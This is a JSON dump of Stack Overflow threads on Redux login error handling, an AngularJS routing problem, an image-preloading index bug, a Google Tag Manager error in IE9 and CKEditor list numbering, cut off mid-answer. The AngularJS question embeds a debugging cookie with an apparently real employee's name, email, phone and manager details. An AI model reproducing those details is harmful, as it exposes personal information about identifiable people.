[{"tags": ["javascript", "reactjs", "redux"], "answers": [{"comments": [{"owner": {"reputation": 1816, "user_id": 4516985, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Sge55.jpg?s=128&g=1", "display_name": "isuruAb", "link": "https://stackoverflow.com/users/4516985/isuruab"}, "edited": false, "score": 0, "creation_date": 1558573524, "post_id": 56266651, "comment_id": 99149601, "body": "Thank you for the response. It does not work. same console out put as above"}], "tags": [], "owner": {"reputation": 5618, "user_id": 2193290, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/QSiK2.jpg?s=128&g=1", "display_name": "Danny Delott", "link": "https://stackoverflow.com/users/2193290/danny-delott"}, "is_accepted": false, "score": 0, "last_activity_date": 1558571736, "creation_date": 1558571736, "answer_id": 56266651, "question_id": 56266400, "link": "https://stackoverflow.com/questions/56266400/redux-action-returns-undefined-to-the-view/56266651#56266651", "title": "redux action returns undefined to the view", "body": "<p>I think your problem is that you're using <code>async/await</code>, but then only handling the case when the <code>doUserLogin</code> is successful. Remember that <code>async/await</code> is basically just sugar over promises.</p>\n\n<p>Try this:</p>\n\n<pre><code>const loginResponse;\ntry {\n  loginResponse = await doUserLogin(userLoginData)\n\n  dispatch({\n    type: ACTION_LOGIN,\n    data: loginResponse,\n  })\n\n  if (loginResponse.token) {\n    history.push('/investments')\n  }\n} catch (e) {\n  console.log(\"error\", e) // this shows the error message\n\n  return e\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 1816, "user_id": 4516985, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Sge55.jpg?s=128&g=1", "display_name": "isuruAb", "link": "https://stackoverflow.com/users/4516985/isuruab"}, "edited": false, "score": 0, "creation_date": 1558669976, "post_id": 56267259, "comment_id": 99184464, "body": "it says <code>onError(loginResponse.error); </code> is not a function"}, {"owner": {"reputation": 155, "user_id": 11222076, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d7fd4c718a13fb1b44640897cb57b29a?s=128&d=identicon&r=PG&f=1", "display_name": "Swapnil", "link": "https://stackoverflow.com/users/11222076/swapnil"}, "reply_to_user": {"reputation": 1816, "user_id": 4516985, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Sge55.jpg?s=128&g=1", "display_name": "isuruAb", "link": "https://stackoverflow.com/users/4516985/isuruab"}, "edited": false, "score": 0, "creation_date": 1558716558, "post_id": 56267259, "comment_id": 99205724, "body": "You need to pass a function as a argument in calling function. Here onUserLogin action has two arguments one for data and other is callback function that is called when an error is occurred. You also need to pass the function while calling this action. Like this =&gt; <code>this.props.onUserLogin(userLoginObject, error =&gt; {          &#47;&#47; Called when error is occurred          this.setState({ formError: resp });        })</code>"}], "tags": [], "owner": {"reputation": 155, "user_id": 11222076, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d7fd4c718a13fb1b44640897cb57b29a?s=128&d=identicon&r=PG&f=1", "display_name": "Swapnil", "link": "https://stackoverflow.com/users/11222076/swapnil"}, "is_accepted": false, "score": 0, "last_activity_date": 1558716731, "last_edit_date": 1558716731, "creation_date": 1558577995, "answer_id": 56267259, "question_id": 56266400, "link": "https://stackoverflow.com/questions/56266400/redux-action-returns-undefined-to-the-view/56267259#56267259", "title": "redux action returns undefined to the view", "body": "<p>Use callback function instead of returning error(maybe it's not possible to return anything from redux actions)</p>\n\n<pre><code>// Login.js\nasync  handleSubmit(event) {\n    let userLoginObject = {\n      login: this.state.username,\n      password: this.state.password,\n    }\n    if (!isEmptyOrNull(this.state.username) &amp;&amp; !isEmptyOrNull(this.state.password)) \n    {\n      let resp = await \n      this.props.onUserLogin(userLoginObject, error =&gt; {\n         // Called when error is occurred\n         this.setState({ formError: error }); \n      })\n      console.log(\"resp\",resp) \n      // this shows 'undefined'\n      this.setState({ formError: resp }); //Im trying to set state to the formError\n    }\n}\n\n\n\n// Action file\nexport const onUserLogin = (userLoginData, onError /** error callback */) =&gt; async (dispatch) =&gt; \n{\n   const loginResponse = await doUserLogin(userLoginData)\n   dispatch({\n      type: ACTION_LOGIN,\n      data: loginResponse,\n  })\n  if (loginResponse.token) {\n      history.push('/investments')\n  }\n  else {\n   console.log(\"err\",loginResponse.error) // this shows the error message\n    onError(loginResponse); // call callback function and send error with it\n    return loginResponse\n  }\n}\n</code></pre>\n\n<p>Using Callback function</p>\n\n<pre><code>this.props.onUserLogin(userLoginObject, error =&gt; {\n   // Called when error is occurred\n   this.setState({ formError: error });\n});\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 776, "user_id": 10888434, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-DmQzYD1me0E/AAAAAAAAAAI/AAAAAAAAAAA/AKxrwca6HMdYnFdW6CqdhEr3Df4q_ssVjg/mo/photo.jpg?sz=128", "display_name": "Charlie", "link": "https://stackoverflow.com/users/10888434/charlie"}, "is_accepted": false, "score": 0, "last_activity_date": 1558590996, "last_edit_date": 1558590996, "creation_date": 1558590366, "answer_id": 56268744, "question_id": 56266400, "link": "https://stackoverflow.com/questions/56266400/redux-action-returns-undefined-to-the-view/56268744#56268744", "title": "redux action returns undefined to the view", "body": "<p>Since you are already using redux, I would recommend a different aproach what if, in your dispatch action you actually save the error message as a prop(if that is the case), and then show it in your component. instead of using </p>\n\n<p>this.setState({ formError: resp });</p>\n\n<p>you can recover the error from redux directly</p>\n\n<p>this.props.errorLogin</p>\n"}], "owner": {"reputation": 1816, "user_id": 4516985, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Sge55.jpg?s=128&g=1", "display_name": "isuruAb", "link": "https://stackoverflow.com/users/4516985/isuruab"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 60, "favorite_count": 0, "answer_count": 3, "score": 2, "last_activity_date": 1558716731, "creation_date": 1558569329, "last_edit_date": 1558574238, "question_id": 56266400, "link": "https://stackoverflow.com/questions/56266400/redux-action-returns-undefined-to-the-view", "title": "redux action returns undefined to the view", "body": "<p>I created simple login form and it works fine. I want to return the error message when API call fails (Login Fails).</p>\n\n<p>Login.js file of the view</p>\n\n<pre><code>async  handleSubmit(event) {\n    let userLoginObject = {\n      login: this.state.username,\n      password: this.state.password,\n    }\n    if (!isEmptyOrNull(this.state.username) &amp;&amp;\n      !isEmptyOrNull(this.state.password)) {\n      let resp = await this.props.onUserLogin(userLoginObject)\n      console.log(\"resp\",resp) // this shows 'undefined'\n      this.setState({ formError: resp }); //Im trying to set state to the formError\n    }\n}\n</code></pre>\n\n<p>action file</p>\n\n<pre><code>export const onUserLogin = (userLoginData) =&gt; async (dispatch) =&gt; {\n  const loginResponse = await doUserLogin(userLoginData)\n  dispatch({\n    type: ACTION_LOGIN,\n    data: loginResponse,\n  })\n  if (loginResponse.token) {\n      history.push('/investments')\n  }\n  else {\n    console.log(\"error\",loginResponse.error) // this shows the error message\n    return loginResponse\n  }\n}\n</code></pre>\n\n<p>After failed  login attempt my console is like this </p>\n\n<pre><code>resp undefined\ntoken:1 POST http://localhost:8000/token 400 (Bad Request)\nauthActions.js:52 error invalid credentials\n</code></pre>\n\n<p>It shows <code>undefined</code> even when I returned just a string inside the action.</p>\n\n<p>What is wrong here ? How can I return the error message when API call fails.</p>\n"}, {"tags": ["javascript", "angularjs", "ajax"], "owner": {"reputation": 51, "user_id": 2501398, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e3571eb60eb566f661a0e5504545407b?s=128&d=identicon&r=PG", "display_name": "user2501398", "link": "https://stackoverflow.com/users/2501398/user2501398"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 22, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1558569146, "creation_date": 1558569146, "question_id": 56266383, "link": "https://stackoverflow.com/questions/56266383/ng-view-does-not-load-pages", "title": "ng-view does not load pages", "body": "<p>I am developing a app that presents page which in turn will present 1 of 2\nother pages based on sql query results.  The primary page will not display\nso that I can select 1 of the other 2 pages</p>\n\n<p>I've already tried putting everything within the controller including the services.</p>\n\n<p>This code should display primary page in order to complete the task.</p>\n\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;\n&lt;head&gt;\n    &lt;title&gt;&lt;/title&gt;\n    &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /&gt;\n    &lt;script src=\"http://home-dev.kmhp.com/global/js/AngularJS/angularjs.min.1.7.5.js\"&gt;&lt;/script&gt;\n    &lt;script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.7.5/angular-route.min.js\"&gt;&lt;/script&gt;\n    &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" /&gt;\n\n\n\n    &lt;script type=\"text/javascript\"&gt;\n        // app\n        var app = angular.module('quickSurveyApp', [\"ngRoute\"]);\n        function SetCookiesForDebugging() {\n            var thecookie = \"departid=351&amp;jobtitle=Digital+Developer&amp;floor=0&amp;username=ij25405&amp;ps%5Fdeptname=Digital+Experience&amp;ps%5Fdeptid=351&amp;cost%5Fcenter=351&amp;birthday%5Fday=16&amp;birthday=0&amp;fsla=&amp;nbsp&amp;psdeptname=Digital+Experience&amp;managerwholename=Lawrence+Raffel&amp;area=215&amp;mailstop=%2D+None+Selected+%2D&amp;managerid=21286&amp;departmentid=0&amp;extension=2158635597&amp;emplid=ij25405&amp;managerusername=LR22638&amp;deptname=KY+Exec+Dir&amp;cubeoffice%5Fno=+&amp;ismanager=0&amp;email=ijohnson%40amerihealthcaritas%2Ecom&amp;lob=1&amp;fname=Isaacy&amp;is%5Fuserlive=1&amp;psdeptid=351&amp;url=%23&amp;costcenter=351&amp;lname=Johnson&amp;company=KEY&amp;managerphone=2159378142&amp;is%5Fmanager=0&amp;wholename=Isaac+Johnson&amp;id=13332&amp;building=0&amp;guest=\"\n            document.cookie = thecookie;\n        }\n\n        // sets all scope variables based on associate cookie information.\n        function SetUser($scope) {\n\n            //Set User Information with Cookie data\n            $scope.IsManager = document.cookie.ismanager;\n            $scope.UserId = document.cookie.userName; \n            $scope.FirstName = document.cookie.fname;\n            $scope.LastName = document.cookie.lname;\n            $scope.EmailAddress = document.cookie.email;\n            $scope.UserName = document.username;\n        }\n\n        // loops through iNSIGHT cookie to retrieve specific value.\n        // removes all HTML characters.\n        function getCookie(name) {\n\n            var cookiesArray = document.cookie.split(\"&amp;\");\n            for (var i = 0; i &lt; cookiesArray.length; i++) {\n\n                var nameValueArray = cookiesArray[i].split(\"=\");\n\n                var cookieName = decodeURI(nameValueArray[0]);\n                var cookieValue = nameValueArray[1].replace(/\\+/g, '%20');\n                cookieValue = decodeURIComponent(cookieValue);\n\n                if (cookieName == name) {\n                    return decodeURI(cookieValue);\n                }\n\n            }\n        }\n\n\n        // controller(s)\n        app.controller(\"VoteCtrl\", [\"$scope\", \"qa\", \"$location\", function ($scope, qa, $location) {\n\n            SetCookiesForDebugging();\n            SetUser($scope);\n\n            $scope.activeQuestions = qa.activeQuestions;\n\n            $scope.records = qa.records;\n            $scope.QuestionText = qa[0].QuestionText;\n            $scope.AnswerText = qa[0].AnswerText;\n            $scope.Answers = qa[0].Answers;\n\n            $scope.error = false;\n\n            $scope.AddVote = function () {\n                //$scope.error = !!$scope.answer;\n                if ($scope.AnswerText == undefined)\n                    $scope.error = true;\n                else {\n                    $scope.error = false;\n                    if (VoteService.getUserVoteCount().then(function (isAlreadyVoted) {\n                        if (isAlreadyVoted)\n                            $location.redirect(\"/alreadyvoted\");\n                    else \n                            $location.redirect(\"/addvote\");\n                    });\n                }\n            };\n\n            $scope.voteRequest = {\n                VoteId: null,\n                VoteDate: null,\n                UserName: $scope.UserName,\n                VoterFname: $scope.FirstName,\n                VoterLname: $scope.LastName,\n                Id: null,\n                QuestionId: null,\n\n                QuestionText: \"\",\n                AnswerText: \"\"\n            };\n            // SetCookiesForDebugging();\n            // SetUser($scope);  \n\n            // inserts new request\n            $scope.insertRequest = function () {\n\n                $http.post(\"/API/quick-survey/api/Vote/AddVote\", $scope.voteRequest).then(function (data, status, headers, config) {\n                    alert(\"success\");\n                }, function (data, status, headers, config) {\n                    console.log(\"error!\");\n                    console.log(data);\n                });\n            };\n\n            // checks if user already voted for a question\n            $scope.getUserVoteCount = function () {\n\n                // get true or false\n                $http.get(\"/API/quick-survey/api/Vote/GetUserVoteCount/866/ij25405/0\").success(function (data, status, headers, config) {\n                    $scope.activeQuestions = data;\n                }).error(function (data, status, headers, config) {\n                    console.log(status);\n                });\n            };\n\n            //radio button click on request form\n            // 05/21/2019 put this in request by zone ????   \n            $scope.handleAnswerRadioClick = function (data) {\n\n                $scope.voteRequest.QuestionId = data.QuestionId;\n                $scope.voteRequest.Id = data.Id;\n                $scope.voteRequest.AnswerText = data.AnswerText;\n            };\n\n            // service(s)\n            app.factory(\"VoteService\", [\"$http\", \"$q\", function ($http, $q) {\n\n                var service = {};\n\n                //Gets all data for page.\n                var questionNumber = 0;\n                service.pageInit = function () {\n                    var deferred = $q.defer();\n                    $http.get('/API/quick-survey/api/Question/GetQuestionsByZone/0').then(function (response) {\n                        deferred.resolve(response.data);\n                    }, function (error) {\n                        console.error(error);\n                        deferred.reject(\"error\");\n                    });\n                    return deferred.promise;\n                };\n\n                // inserts new request\n                service.insertRequest = function () {\n                    var deferred = $q.defer();\n                    $http.post(\"/API/quick-survey/api/Vote/AddVote\", $scope.voteRequest).then(function (data, status, headers, config) {\n                        deferred.resolve(data); // you should send back something usefull like : {\"success\":true}\n                        console.log(\"success\");\n                    }, function (data, status, headers, config) {\n                        console.log(\"error!\");\n                        console.log(data);\n                        deferred.reject(\"error\");\n                    });\n                    return deferred.promise;\n                };\n\n                // checks if user already voted for a question\n                // get true or false\n                service.getUserVoteCount = function () {\n                    var deferred = $q.defer();\n                    $http.get(\"/API/quick-survey/api/Vote/GetUserVoteCount/866/ij25405/0\").success(function (data, status, headers, config) {\n                        deferred.resolve(data);\n                    }).error(function (data, status, headers, config) {\n                        console.log(status);\n                        deferred.reject(\"error\");\n                    });\n                    return deferred.promise;\n                };\n\n                return service;\n\n            }]);\n\n            // route(s)\n            app.config([\"$routeProvider\", function ($routeProvider) {\n                $routeProvider\n                .when(\"/\", {\n\n                    templateUrl: \"/api-test-pages/Quick-Survey/survey.html\",\n\n                    controller: \"VoteCtrl\",\n                    // it's is good to download the data before displaying the template without the data\n                    // so all we found in resolve is gonna be \"resolved\" before display the page and running the controller\n                    resolve: {\n                        qa: [\"VoteService\", \"$route\", function (VoteService, $route) {\n                            return VoteService.pageInit();\n                        }]\n                    }\n\n                }).\n                otherwise({\n                    redirectTo: '/'\n                });\n\n            }]);\n        }]);\n         &lt;/script&gt;\n\n\n&lt;/head&gt;\n&lt;body ng-app=\"quickSurveyApp\"&gt;\n    &lt;div&gt;\n        &lt;h1&gt;Quick Survey&lt;/h1&gt;\n        &lt;div ng-view&gt;&lt;/div&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n// Primary Display below was working until I changed AddVote and services\n&lt;div&gt;\n    &lt;h2&gt;{{QuestionText}}&lt;/h2&gt;\n    &lt;div ng-hide=\"!!Answer\"&gt;please select an answer&lt;/div&gt;\n    &lt;br ng-repeat-start=\"a in Answers track by a.Id\" /&gt;\n    &lt;input id=\"button{{a.AnswerText}}\" name=\"selection\" value=\"{{a.AnswerText}}\" type=\"radio\" ng-model=\"$parent.Answer\" /&gt;\n    &lt;label for=\"button{{a.AnswerText}}\" ng-repeat-end&gt;{{a.AnswerText}}&lt;/label&gt;\n    &lt;br /&gt;\n    &lt;span ng-show=\"error&amp;&amp;!Answer\"&gt;error no answer selected&lt;/span&gt;\n\n\n    &lt;br /&gt;\n    &lt;br /&gt;\n    &lt;input id=\"surveybtn\" type=\"submit\" value=\"Vote Now\" ng-click=\"AddVote()\" /&gt;\n\n&lt;/div&gt;\n</code></pre>\n"}, {"tags": ["javascript", "html", "css"], "comments": [{"owner": {"reputation": 8371, "user_id": 1253479, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/96be1b5180156bd6c681b1438fad2bb9?s=128&d=identicon&r=PG", "display_name": "Jack", "link": "https://stackoverflow.com/users/1253479/jack"}, "edited": false, "score": 1, "creation_date": 1558569269, "post_id": 56266368, "comment_id": 99148858, "body": "<code>imageArray[arrayIndex].src + &#39;&gt;&#39;;</code> should be <code>imageArray[r].src + &#39;&gt;&#39;;</code> ? (or <code>c</code>?) Or, am I missing the <code>arrayIndex</code> ?"}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 11542079, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-WFWeegoNjKM/AAAAAAAAAAI/AAAAAAAAAGU/1wDkjNor5Y8/photo.jpg?sz=128", "display_name": "Jacob G", "link": "https://stackoverflow.com/users/11542079/jacob-g"}, "edited": false, "score": 0, "creation_date": 1558569714, "post_id": 56266409, "comment_id": 99148951, "body": "WOW, Thank you so SO much for that. I have been stuck on this for so long. I appreciate that very much."}, {"owner": {"reputation": 7965, "user_id": 6504633, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ac20a524c7ab77fee62995c374a1f8a?s=128&d=identicon&r=PG&f=1", "display_name": "obscure", "link": "https://stackoverflow.com/users/6504633/obscure"}, "reply_to_user": {"reputation": 1, "user_id": 11542079, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-WFWeegoNjKM/AAAAAAAAAAI/AAAAAAAAAGU/1wDkjNor5Y8/photo.jpg?sz=128", "display_name": "Jacob G", "link": "https://stackoverflow.com/users/11542079/jacob-g"}, "edited": false, "score": 0, "creation_date": 1558570467, "post_id": 56266409, "comment_id": 99149109, "body": "No problem! Glad I could help. =)"}], "tags": [], "owner": {"reputation": 7965, "user_id": 6504633, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ac20a524c7ab77fee62995c374a1f8a?s=128&d=identicon&r=PG&f=1", "display_name": "obscure", "link": "https://stackoverflow.com/users/6504633/obscure"}, "is_accepted": false, "score": 3, "last_activity_date": 1558569467, "creation_date": 1558569467, "answer_id": 56266409, "question_id": 56266368, "link": "https://stackoverflow.com/questions/56266368/i-am-preloading-images-in-an-array-and-cannot-call-the-src-property/56266409#56266409", "title": "I am preloading images in an array and cannot call the &quot;.src&quot; property?", "body": "<p><strong>imageArray</strong> is an empty array you're populating using this for-loop:</p>\n\n<pre><code>for(var c = 0; c &lt; cols; c++) {\n    imageArray[arrayIndex] = new Image();\n    imageArray[arrayIndex].src = \"../images/bcpot00\" + img + \"/bcpot00\" + img + \"_r\" + (r+1) + \"_c\" + (c+1) + \".jpg\";\n    arrayIndex++;\n    console.dir(imageArray);\n}\n</code></pre>\n\n<p>To refer to a specific element inside this array you're using a global variable called <strong>arrayIndex</strong> - which you also increment in this loop.\nAfter this loop finishes this variable's value will keep it's last value.</p>\n\n<p>Later on inside the <strong>assemble()</strong> function you're reusing this variable without resetting it to zero and incrementing it in the loop again.</p>\n\n<pre><code>        for(var c = 0; c &lt; cols; c++) {\n            table += '&lt;td id = \"jsImg\"&gt;';\n            table += '&lt;img height = 50px width = 65px src = ' + \n            imageArray[arrayIndex].src + '&gt;';\n            table += '&lt;/td&gt;';\n        }\n</code></pre>\n\n<p>Try this instead:</p>\n\n<pre><code>function assemble() {\n  arrayIndex = 0;\n  for (var r = 0; r &lt; rows; r++) {\n\n    table += '&lt;tr&gt;';\n\n    for (var c = 0; c &lt; cols; c++) {\n      table += '&lt;td id = \"jsImg\"&gt;';\n      table += '&lt;img height = 50px width = 65px src = ' +\n        imageArray[arrayIndex].src + '&gt;';\n      table += '&lt;/td&gt;';\n      arrayIndex++;\n    }\n\n    table += '&lt;/tr&gt;';\n  }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 14667, "user_id": 535480, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jBU8R.jpg?s=128&g=1", "display_name": "James", "link": "https://stackoverflow.com/users/535480/james"}, "is_accepted": false, "score": 0, "last_activity_date": 1558570597, "creation_date": 1558570597, "answer_id": 56266544, "question_id": 56266368, "link": "https://stackoverflow.com/questions/56266368/i-am-preloading-images-in-an-array-and-cannot-call-the-src-property/56266544#56266544", "title": "I am preloading images in an array and cannot call the &quot;.src&quot; property?", "body": "<p>Just a couple of tips</p>\n\n<p>You don't need to use the arrayIndex variable at all in the preloader function if you <code>.push</code> the new image into the array.</p>\n\n<pre><code>var imageArray = [];\n\nfunction preloader() {\n  for(var r = 0; r &lt; rows; r++) {\n    for(var c = 0; c &lt; cols; c++) {\n      var pic = new Image();\n      pic.src = \"../images/bcpot00\" + img + \"/bcpot00\" + img + \"_r\" + (r+1) + \"_c\" + (c+1) + \".jpg\";\n      imageArray.push(pic);\n    }\n  }\n}\n</code></pre>\n\n<p>Then in your assemble function you can easily compute the arrayIndex from the r and c variables</p>\n\n<pre><code>function assemble() {\n  for(var r = 0; r &lt; rows; r++) {\n    table += '&lt;tr&gt;';\n    for(var c = 0; c &lt; cols; c++) {\n      var arrayIndex = r * cols + c;\n      table += '&lt;td id = \"jsImg\"&gt;';\n      table += '&lt;img height = 50px width = 65px src = ' \n        + imageArray[arrayIndex].src + '&gt;';\n      table += '&lt;/td&gt;';\n    }\n    table += '&lt;/tr&gt;';\n  }\n}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 11542079, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-WFWeegoNjKM/AAAAAAAAAAI/AAAAAAAAAGU/1wDkjNor5Y8/photo.jpg?sz=128", "display_name": "Jacob G", "link": "https://stackoverflow.com/users/11542079/jacob-g"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 32, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1558570597, "creation_date": 1558568997, "last_edit_date": 1558569508, "question_id": 56266368, "link": "https://stackoverflow.com/questions/56266368/i-am-preloading-images-in-an-array-and-cannot-call-the-src-property", "title": "I am preloading images in an array and cannot call the &quot;.src&quot; property?", "body": "<p>I'm currently setting up an array to preload 20 images which has been successful, but now I am wanting to call on this array to assemble the images in a table.\nWhat is the best way to do this?\nAs it is giving me an error that the property of \".src\" is undefined.</p>\n\n<pre><code>//This is the function that is currently preloading the array of images.\n\nvar imageArray = new Array();\nvar arrayIndex = 0;\n\nfunction preloader() {\nfor(var r = 0; r &lt; rows; r++) {\n    for(var c = 0; c &lt; cols; c++) {\n        imageArray[arrayIndex] = new Image();\n        imageArray[arrayIndex].src = \"../images/bcpot00\" + img + \"/bcpot00\" + img + \"_r\" + (r+1) + \"_c\" + (c+1) + \".jpg\";\n        arrayIndex++;\n        console.dir(imageArray);\n    }\n  }\n}  \n\n//This is the function that is currently assembling the images.\n\nfunction assemble() {\n    for(var r = 0; r &lt; rows; r++) {\n\n            table += '&lt;tr&gt;';\n\n                for(var c = 0; c &lt; cols; c++) {\n                    table += '&lt;td id = \"jsImg\"&gt;';\n                    table += '&lt;img height = 50px width = 65px src = ' + \n                    imageArray[arrayIndex].src + '&gt;';\n                    table += '&lt;/td&gt;';\n                }\n\n            table += '&lt;/tr&gt;';\n}\n</code></pre>\n\n<p>I expected that it would call the source from the array when 'imageArray[arrayIndex].src' was inputed but all it gave me was an undefined src property.</p>\n"}, {"tags": ["javascript", "internet-explorer", "google-tag-manager"], "comments": [{"owner": {"reputation": 8001, "user_id": 10309381, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a284b365772283540b23d67dbbbd2d2e?s=128&d=identicon&r=PG&f=1", "display_name": "Deepak-MSFT", "link": "https://stackoverflow.com/users/10309381/deepak-msft"}, "edited": false, "score": 0, "creation_date": 1558574627, "post_id": 56266355, "comment_id": 99149801, "body": "You can try to refer this link may give you some information that may help to understand the issue in better way. Ref: <a href=\"https://www.analyticsmania.com/post/undefined-variable-in-google-tag-manager/#gref\" rel=\"nofollow noreferrer\">analyticsmania.com/post/&hellip;</a> I can see that you are using IE 9. IE 9 is outdated and currently not supported. It is recommended to upgrade to IE 11."}, {"owner": {"reputation": 147, "user_id": 3624321, "user_type": "registered", "accept_rate": 67, "profile_image": "https://graph.facebook.com/1390780727/picture?type=large", "display_name": "Alvaro Alday", "link": "https://stackoverflow.com/users/3624321/alvaro-alday"}, "reply_to_user": {"reputation": 8001, "user_id": 10309381, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a284b365772283540b23d67dbbbd2d2e?s=128&d=identicon&r=PG&f=1", "display_name": "Deepak-MSFT", "link": "https://stackoverflow.com/users/10309381/deepak-msft"}, "edited": false, "score": 0, "creation_date": 1558624966, "post_id": 56266355, "comment_id": 99171071, "body": "Deepak-MSFT using ie 9 is part of customer requirements, some of their systems depend directly on using internet explorer and not meeting this requirement might cause them to stop using our app."}, {"owner": {"reputation": 8001, "user_id": 10309381, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a284b365772283540b23d67dbbbd2d2e?s=128&d=identicon&r=PG&f=1", "display_name": "Deepak-MSFT", "link": "https://stackoverflow.com/users/10309381/deepak-msft"}, "edited": false, "score": 0, "creation_date": 1558664294, "post_id": 56266355, "comment_id": 99183626, "body": "I try to search for a possible solution or a work around. at present, I did not found any work around that can help to avoid the issue. I will try to inform you if I get any relevant information in future. Thanks for your understanding."}, {"owner": {"reputation": 1760, "user_id": 11447682, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/63632054e8c0b2dbf12d84627607ef56?s=128&d=identicon&r=PG&f=1", "display_name": "Joshua T", "link": "https://stackoverflow.com/users/11447682/joshua-t"}, "edited": false, "score": 0, "creation_date": 1558691148, "post_id": 56266355, "comment_id": 99192453, "body": "What makes you think that IE9 does not support a simple Array.push? That has been supported since 5.5... there is nothing in the code that you posted that would trigger that error, and as others have pointed out, you should look to see what else is calling GTM. If you look at the console error for <code>SCRIPT5009</code>, it might show a filename below it and line of code that triggered the error."}], "answers": [{"comments": [{"owner": {"reputation": 147, "user_id": 3624321, "user_type": "registered", "accept_rate": 67, "profile_image": "https://graph.facebook.com/1390780727/picture?type=large", "display_name": "Alvaro Alday", "link": "https://stackoverflow.com/users/3624321/alvaro-alday"}, "edited": false, "score": 0, "creation_date": 1558571281, "post_id": 56266521, "comment_id": 99149223, "body": "This is the only place in my entire app in which &quot;.gtm&quot; or anything alike is found."}], "tags": [], "owner": {"reputation": 91, "user_id": 6939790, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2405f2f3f8e03319f5c9f4c74604e52b?s=128&d=identicon&r=PG&f=1", "display_name": "alee046", "link": "https://stackoverflow.com/users/6939790/alee046"}, "is_accepted": false, "score": 0, "last_activity_date": 1558570342, "creation_date": 1558570342, "answer_id": 56266521, "question_id": 56266355, "link": "https://stackoverflow.com/questions/56266355/how-to-fix-gtm-is-undefined-error-in-ie9/56266521#56266521", "title": "How to fix &#39;gtm&#39; is undefined error in IE9?", "body": "<p>I'm not sure what you redacted from that block, but whatever that is, seems to be throwing that error. 'gtm' is undefined to me seems like you calling a variable set as 'gtm' in the script. The block you posted only has 'gtm' referenced in a string.</p>\n"}], "owner": {"reputation": 147, "user_id": 3624321, "user_type": "registered", "accept_rate": 67, "profile_image": "https://graph.facebook.com/1390780727/picture?type=large", "display_name": "Alvaro Alday", "link": "https://stackoverflow.com/users/3624321/alvaro-alday"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 281, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1558570342, "creation_date": 1558568841, "last_edit_date": 1558569238, "question_id": 56266355, "link": "https://stackoverflow.com/questions/56266355/how-to-fix-gtm-is-undefined-error-in-ie9", "title": "How to fix &#39;gtm&#39; is undefined error in IE9?", "body": "<p>I'm using google tag manager to paste some general purpose scripts in my project, and I need it to be able to run IE9.</p>\n\n<p>But when I attempt to execute the script in browser I get the following error: </p>\n\n<blockquote>\n  <p>SCRIPT5009: 'gtm' is undefined</p>\n</blockquote>\n\n<p>This is a little breakdown of the script (redacted sensitive data).</p>\n\n<pre><code>(function(w,d,s,l,i){\n    w[l]=w[l]||[];\n    w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});\n    var f=d.getElementsByTagName(s)[0];\n    var j=d.createElement(s);\n    var dl=l!='dataLayer'?'&amp;l='+l:'';\n    j.async=true;\n    j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;\n    f.parentNode.insertBefore(j,f);\n})(window,document,'script','dataLayer','GTM-xxxxxxx'); \n</code></pre>\n\n<p>I understand that IE9 doesn't support this:</p>\n\n<pre><code>w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});\n</code></pre>\n\n<p>However, I wonder if there's a workaround for this issue. I've been searching for an answer but I found nothing helpful.</p>\n"}, {"tags": ["javascript", "ckeditor"], "answers": [{"tags": [], "owner": {"reputation": 2168, "user_id": 4555078, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/752084347508708631fbaaf8475f86ea?s=128&d=identicon&r=PG&f=1", "display_name": "j.swiderski", "link": "https://stackoverflow.com/users/4555078/j-swiderski"}, "is_accepted": false, "score": 0, "last_activity_date": 1558599150, "creation_date": 1558599150, "answer_id": 56270791, "question_id": 56266317, "link": "https://stackoverflow.com/questions/56266317/is-it-possible-to-continue-numbering-after-inserting-an-image-in-ckeditor/56270791#56270791", "title": "Is it possible to continue numbering after inserting an image in Ckeditor?", "body": "<p>If for some reason list gets broken in two (it should not take place IMHO) when you insert an image, you can use <a href=\"https://ckeditor.com/cke4/addon/liststyle\" rel=\"nofollow noreferrer\">List Style</a> plugin to set then start number to 3 for the second 